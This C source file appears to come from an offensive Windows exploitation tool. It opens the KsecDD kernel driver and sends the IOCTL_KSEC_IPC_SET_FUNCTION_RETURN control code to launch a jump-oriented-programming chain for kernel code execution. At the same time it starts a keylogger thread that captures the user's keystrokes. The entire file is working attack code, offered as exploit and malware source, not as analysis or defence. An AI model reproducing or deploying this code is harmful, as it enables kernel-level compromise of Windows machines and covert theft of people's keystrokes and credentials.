#include "launcher/kexecdd.h"
#include "launcher/keylog.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include "utils/vec.h"
#include <Windows.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <winnt.h>
#include <winternl.h>

bool kexec_get_driver_handle(HANDLE *ksec_handle, HANDLE write_handle)
{
    UNICODE_STRING driver_unicode_name = {0};
    OBJECT_ATTRIBUTES object_attributes = {0};
    IO_STATUS_BLOCK io_status_block = {0};
    NTSTATUS status = 0;

    RtlInitUnicodeString(&driver_unicode_name, L"\\Device\\KsecDD");

    InitializeObjectAttributes(&object_attributes, &driver_unicode_name, 0, NULL, NULL);

    status = NtOpenFile(
        ksec_handle,
        GENERIC_READ | GENERIC_WRITE,
        &object_attributes,
        &io_status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0
    );
    if (!NT_SUCCESS(status))
    {
        CHILD_LOG_ERROR(
            write_handle,
            "Failed opening ksecdd device handle. NTSTATUS: %lx\n",
            status
        );
    }

    return true;
}

bool kexec_start_jop_and_key_log(
    Vec *pipes, HANDLE ksec_handle, HANDLE write_handle, KsecReturnStruct *return_struct
)
{
    bool status = false;
    HANDLE jop_thread_handle = {0}, keylog_thread_handle = {0};
    BOOL result = FALSE;
    KeyLogParams *params = nullptr;

    params = jalloc(sizeof(KeyLogParams));
    if (params == nullptr)
    {
        CHILD_LOG_ERROR(write_handle, "Failed allocating memory.\n");
        goto end;
    }

    result = DuplicateHandle(
        GetCurrentProcess(),
        GetCurrentThread(),
        GetCurrentProcess(),
        &jop_thread_handle,
        MAXIMUM_ALLOWED,
        TRUE,
        0
    );

    if (result == FALSE)
    {
        CHILD_LOG_ERROR(
            write_handle,
            "Failed duplicating current thread handle. GetLastError: %ld\n",
            GetLastError()
        );
        goto end;
    }

    params->child_pipe = write_handle;
    params->jop_thread = jop_thread_handle;
    params->pipes = pipes;

    keylog_thread_handle =
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)keylog_start, params, 0, nullptr);

    if (keylog_thread_handle == nullptr)
    {
        CHILD_LOG_ERROR(
            write_handle,
            "Failed creating keylog thread. GetLastError: %ld\n",
            GetLastError()
        );
        goto end;
    }

    status = kexec_start_jop(ksec_handle, write_handle, return_struct);
end:
    return status;
}

bool kexec_start_jop(HANDLE ksec_handle, HANDLE write_handle, KsecReturnStruct *return_struct)
{
    IO_STATUS_BLOCK io_status_block = {0};
    bool result = false;
    NTSTATUS status = 0;

    CHILD_LOG_SUCCESS(write_handle, "Starting JOP chain!\n");

    status = NtDeviceIoControlFile(
        ksec_handle,
        nullptr,
        nullptr,
        nullptr,
        &io_status_block,
        IOCTL_KSEC_IPC_SET_FUNCTION_RETURN,
        &return_struct,
        sizeof(KsecReturnStruct),
        nullptr,
        0
    );
    if (!NT_SUCCESS(status))
    {
        CHILD_LOG_ERROR(
            write_handle,
            "Failed calling SET_FUNCTION_RETURN ioctl. NTSTATUS: %lx\n",
            status
        );
        goto end;
    }

    result = true;
end:
    return result;
}

bool kexec_connect(HANDLE ksec_handle, HANDLE write_handle)
{
    IO_STATUS_BLOCK io_status_block = {0};
    NTSTATUS status = 0;
    DWORD pid = 0;

    status = NtDeviceIoControlFile(
        ksec_handle,
        nullptr,
        nullptr,
        nullptr,
        &io_status_block,
        IOCTL_KSEC_CONNECT_LSA,
        nullptr,
        0,
        &pid,
        sizeof(pid)
    );
    if (!NT_SUCCESS(status))
    {
        CHILD_LOG_ERROR(
            write_handle,
            "Failed setting CONNECT ioctl to ksecdd.sys. NTSTATUS: %lx\n",
            status
        );
        goto cleanup;
    }

    CHILD_LOG_SUCCESS(write_handle, "Successfully sent CONNECT ioctl to ksecdd.sys.\n");

cleanup:
    return true;
}